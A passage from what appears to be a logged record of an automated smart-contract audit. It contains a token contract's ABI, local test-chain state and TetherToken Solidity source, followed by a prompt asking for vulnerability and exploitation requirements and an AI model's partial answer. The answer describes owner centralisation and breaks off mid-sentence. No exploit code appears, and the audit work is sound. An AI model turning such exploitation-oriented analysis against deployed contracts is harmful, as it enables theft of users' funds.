"Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and fee parameters. It inherits from several contracts:  \n- Ownable: ownership management  \n- BasicToken and StandardToken: ERC20 token logic with fee deduction on transfers  \n- Pausable: emergency stop mechanism controlled by owner  \n- BlackList: ability to blacklist addresses and destroy their token balances  \n- UpgradedStandardToken interface: for forwarding calls to an upgraded token contract if deprecated  \n\nKey features and logic:  \n- The token supply is initially assigned to the owner.  \n- Transfers and transferFrom apply fees (basisPointsRate and maximumFee), which go to the owner.  \n- The contract can be paused/unpaused by the owner, disabling transfers when paused.  \n- Blacklisted addresses cannot transfer tokens, and their balances can be destroyed by the owner.  \n- The contract supports deprecation: forwarding calls to a new upgraded contract address.  \n- Owner can issue new tokens or redeem tokens from their balance.  \n- Fee parameters are capped (basisPointsRate < 20, maximumFee < 50 tokens).  \n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2. Vulnerability Assessment:  \n\n**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause the contract, blacklist/unblacklist addresses, destroy blacklisted funds, issue new tokens arbitrarily, redeem tokens, set fee parameters, and deprecate the 